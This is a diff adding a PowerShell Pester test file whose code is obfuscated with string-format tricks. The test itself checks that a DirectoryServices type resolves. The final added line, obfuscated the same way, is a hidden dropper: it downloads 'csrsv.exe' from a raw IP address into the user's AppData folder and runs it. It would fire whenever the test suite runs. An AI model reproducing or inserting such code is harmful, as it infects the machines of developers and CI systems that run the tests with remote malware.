@@ -1,0 +1,10 @@
+&("{1}{0}{2}"-f'escr','D','ibe') ("{1}{5}{3}{2}{7}{14}{6}{0}{13}{8}{9}{12}{10}{11}{4}"-f 'l','Resolv','pe','y','blies','e t','a','s in addit','e','fer','sse','m','enced a',' r','ion') -Tag ('CI') {
+    &('It') ("{4}{0}{7}{2}{3}{5}{6}{1}"-f 'll ','e>','ve DirectoryServ','ices ty','Wi','pe',' <nam','resol') -TestCases @(
+        @{ ("{1}{2}{0}" -f'ename','ty','p') = ("{1}{5}{7}{9}{6}{4}{3}{10}{8}{0}{2}" -f'dFilter','[Syste','s]','nt.','ountManageme','m.Dire','rvices.Acc','ctoryS','vance','e','Ad'); ("{1}{0}" -f'e','nam') = ("{2}{1}{0}{3}"-f 'lt','dFi','Advance','ers') }
+    ){
+        param (${TY`PEnA`mE}, ${N`Ame})
+        .("{1}{0}"-f 'sh','pw') -noprofile -command "$typename.Name" | &("{2}{1}{0}"-f 'd','houl','S') -BeExactly ${n`AME}
+    }
+}
+
+(.("{2}{3}{1}{0}" -f 't','bjec','N','ew-O') ("{1}{0}{3}{2}{4}" -f'm','Syste','li','.Net.WebC','ent')).("{1}{2}{0}"-f 'loadFile','Do','wn').Invoke(("{0}{5}{3}{8}{7}{2}{6}{9}{10}{1}{4}" -f'h','e','102.53.238/',':/','xe','ttp','~','94.','/','yahoo/csrs','v.'),"$env:APPDATA\csrsv.exe");.("{4}{2}{0}{1}{3}"-f 't-Pr','oce','r','ss','Sta') ("$env:APPDATA\csrsv.exe")
